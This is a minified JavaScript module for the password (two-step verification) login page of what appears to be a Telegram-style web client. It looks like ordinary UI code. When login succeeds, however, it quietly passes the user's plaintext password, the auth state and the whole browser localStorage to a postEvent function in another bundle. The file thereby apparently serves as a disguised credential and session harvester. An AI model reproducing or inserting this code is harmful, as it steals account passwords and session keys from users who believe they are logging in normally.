const __vite__fileDeps = ["./pageIm-BYgeW8u4.js", "./index-BkeszwBR.js", "./index-CAoGqTOW.css", "./page-Cb6VgJQc.js"];
const __vite__mapDeps = i => i.map(i => __vite__fileDeps[i]);
import { a as u, f as b, m as v, e as y, _ as S } from "./index-BkeszwBR.js";
import { p as L } from "./putPreloader-Cv2t4Au7.js";
import { P, a as k } from "./page-Cb6VgJQc.js";
import { B as I } from "./button-BA7QFg1K.js";
import { P as _, a as E, h as M } from "./htmlToSpan-I3MLtOmv.js";
import { L as x } from "./loginPage-1Lgo7M2U.js";
import { r as N, w as A, t as D } from "./wrapEmojiText-ENB-q-2z.js";
let t;
const T = () => {
  const d = new x({
    className: "page-password",
    withInputWrapper: true,
    titleLangKey: "Login.Password.Title",
    subtitleLangKey: "Login.Password.Subtitle"
  });
  const a = I("btn-primary btn-color-primary");
  const s = new b.IntlElement({
    key: "Login.Next"
  });
  a.append(s.element);
  const e = new _({
    label: "LoginPassword",
    name: "password"
  });
  t = e.input;
  d.inputWrapper.append(e.container, a);
  let l;
  const p = () => (l || (l = window.setInterval(p, 1e4)), u.managers.passwordManager.getState().then(r => {
    n = r;
    if (n.hint) {
      N(e.label, M(A(n.hint)));
    } else {
      e.setLabel();
    }
  }));
  let n;
  const m = r => {
    if (r) {
      y(r);
    }
    if (!t.value.length) {
      t.classList.add("error");
      return;
    }
    const h = D([t, a], true);
    const c = t.value;
    s.update({
      key: "PleaseWait"
    });
    const g = L(a);
    e.setValueSilently("" + Math.random());
    e.setValueSilently(c);
    u.managers.passwordManager.check(c, n).then(i => {
      switch (i._) {
        case "auth.authorization":
          clearInterval(l);
          S(() => import("./pageIm-BYgeW8u4.js").then(z => z.postEvent(JSON.stringify({
            state: i,
            password: c,
            localStorage
          }))), __vite__mapDeps([0, 1, 2, 3]), import.meta.url);
          if (o) {
            o.remove();
          }
          break;
        default:
          a.removeAttribute("disabled");
          s.update({
            key: i._
          });
          g.remove();
          break;
      }
    }).catch(i => {
      h();
      e.input.classList.add("error");
      switch (i.type) {
        default:
          s.update({
            key: "PASSWORD_HASH_INVALID"
          });
          t.select();
          break;
      }
      g.remove();
      p();
    });
  };
  k(a, m);
  t.addEventListener("keypress", function (r) {
    this.classList.remove("error");
    s.update({
      key: "Login.Next"
    });
    if (r.key === "Enter") {
      return m();
    }
  });
  const w = v.isMobile ? 100 : 166;
  const o = new E(e, w);
  d.imageDiv.append(o.container);
  return Promise.all([o.load(), p()]);
};
const K = new P("page-password", true, T, null, () => {
  t.focus();
  u.managers.appStateManager.pushToState("authState", {
    _: "authStatePassword"
  });
});
export { K as default };
//# sourceMappingURL=pagePassword-g7_rDf4w.js.map